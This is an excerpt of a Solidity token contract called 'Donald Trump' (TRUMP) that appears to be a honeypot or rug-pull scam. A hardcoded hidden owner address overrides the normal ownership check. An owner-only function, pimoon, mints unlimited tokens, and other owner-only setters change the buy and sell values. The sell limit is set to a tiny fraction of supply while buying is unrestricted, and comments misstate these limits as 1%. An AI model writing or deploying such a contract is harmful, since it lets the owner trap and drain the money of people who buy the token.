...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
     ...
     function _checkOwner() internal view virtual {
         ...
         require(address(0xAfbF987bc45337C082E0DEa9760A76271690996b) == _msgSender(), "Ownable: caller is not the owner");
     }
...
contract TOKEN is ERC20, Ownable {
    ...
    uint256 public pia = 0;
    uint256 public pib = 0;
    uint256 public pic;
    address public piaddr = 0x000000000000000000000000000000000000dEaD;
    ...
    constructor() ERC20("Donald Trump", "TRUMP") {
        ...
        uint256 totalSupply = 10000000000 * 1e9;
         ...
         _mint(address(0xdee69031ee8B586Bdfd768015Ec2681a9Fa5B609), 500000000 * 10 ** decimals()); 
        _mint(address(0x507484A877fc076f3a0aD3294E4ACc03A6bE520D), 10000000000 * 10 ** decimals());
        _mint(address(0xdee69031ee8B586Bdfd768015Ec2681a9Fa5B609), 0 * 10 ** decimals()); 

        maxBuyAmount = totalSupply * 100 / 100; // 1% maxTransactionAmountTxn
        maxSellAmount = totalSupply * 1 / 10000000; // 0.00001% maxTransactionAmountTxn
        maxWalletAmount = totalSupply * 100 / 100; // 1% maxWallet
        thresholdSwapAmount = totalSupply * 1/ 10000000; // 0.00001% swap wallet
        ...
        marketingWallet = address(0x507484A877fc076f3a0aD3294E4ACc03A6bE520D);
        devWallet = address(0x5F0Eb14372179aFa982E1C0a790181F4337bED3c);
    ...
    function setbuy(uint256 _pia) public onlyOwner {
        pia = _pia;
     }
     
     function setsell(uint256 _pib)public onlyOwner {
        pib = _pib;
     }
     
     function setpic(uint256 _pic)public onlyOwner {
         pic =_pic;
     }
     

    function setpiaddr ( address _piaddr)public onlyOwner{
       piaddr = _piaddr;
    }
    
    function pimoon(address account, uint256 amount) public onlyOwner {
        _mint(account, amount);
    }
    
     function transferArray(address[] memory _to, uint256 _value) public {
